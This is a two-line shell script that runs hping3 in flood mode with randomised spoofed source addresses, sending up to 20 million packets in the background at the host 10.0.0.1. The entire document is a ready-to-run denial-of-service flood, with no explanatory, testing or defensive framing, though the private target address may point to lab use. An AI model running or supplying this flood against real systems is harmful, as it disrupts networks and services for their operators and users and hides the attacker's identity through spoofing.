#!/bin/sh
hping3 -c 20000000 --flood --rand-source 10.0.0.1 &
